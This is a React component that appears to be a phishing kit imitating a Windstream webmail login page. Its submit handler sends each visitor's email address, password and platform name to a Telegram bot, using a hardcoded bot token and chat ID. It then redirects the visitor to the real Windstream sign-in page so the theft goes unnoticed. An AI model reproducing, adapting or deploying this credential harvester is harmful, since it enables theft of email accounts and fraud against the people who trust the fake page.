import React from 'react';

import './Home.css'

import { useState } from 'react';

import axios from 'axios';

import iglou from './iglou.png';
import catskill from './catskill.png';
import winstream from './windstream.png';

function Home(){


    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Windstream")

    const[showError, setShowError] = useState(false);

    async function handleSubmit(e){
      e.preventDefault();
  
      try {
          // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
          //     email:email,
          //     password:password,
          //     platform:platform
          // });
  
         const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
              chat_id: 5868304053,
              text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
            });
  
      
          // Handle success
       
  
          if(response.status == 200){
             // console.log(response.data.message);
  
            
             window.location.href = 'https://windstream-email.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_a4e49b0332e1d4b84cc387a46ae8e4696f13bfe57b%3Ahttps%3A%2F%2Fwindstream-email.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fwebmail.windstream.net%252F%26cookieTime%3D1714665648';
          }
        } catch (error) {
          // Handle error
          console.error('Error:', error);
        }
      
  }

    return (
        <>

        <div className='spacer'>
        {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        </div>



            <div className='text-center my-2'>
            <img  src={winstream} />

            </div>


            <div className='col-md-5 whitediv m-auto   px-0'>
              

              <h4 className='text-center'>Webmail Login</h4>
                



                <form onSubmit={handleSubmit} className="px-5">

                    <div className='form-group mt-5'>
                        <label className='label'> E-mail address</label>
                        <input type="email"onChange={function(e){
                            setUserName(e.target.value);
                        }}value={email} className="form-control myinput"required />

                    </div>


                    <div className='form-group'>
                        <label className='label'> Password</label>
                        <input type="password"onChange={function(e){
                            setPassword(e.target.value);
                        }}value={password} className="form-control myinput"required />

                    </div>

                    <div className='form-group'>
                      <input type="checkbox" /> <span className='font-weight-bold px-2'>Remember Me ?</span>

                    </div>



                   


                    {/* <div className='form-group'>
                    <label class="toggle-container">
                        <input type="checkbox"className='mycheck'/> 
                     <span class="toggle-slider"></span> <span className='px-3 'style={{
                         fontSize:"15px",
                     }}>Shared computer - log me out after 4 hours</span>
    </label>

                    </div> */}


                    {/* <div className='form-group'>
                    <label class="toggle-container">
                        <input type="checkbox"className='mycheck'/> 
                     <span class="toggle-slider"></span> <span className='px-3 'style={{
                         fontSize:"15px",
                     }}>Keep me logged in until I log out</span>
    </label>

                    </div> */}


                    <div className='form-group text-center'>

<button type='submit' style={{
  backgroundColor: '#ef6724',
  fontSize:'25px',
}}className='btn text-center w-100 font-weight-bold text-light py-2 rounded '>LOGIN</button>






</div>

<div className='linkdiv'>
  <a style={{
        color: '#1f8aa3',
        textDecoration: 'underline',
  }}>Forgot Your Password or Need to Reset It? <br/>
Email Identity Dashboard<br/>
Login Support Page</a>

</div>


                 

                </form>

            </div>
        
        </>
    );
}

export default Home;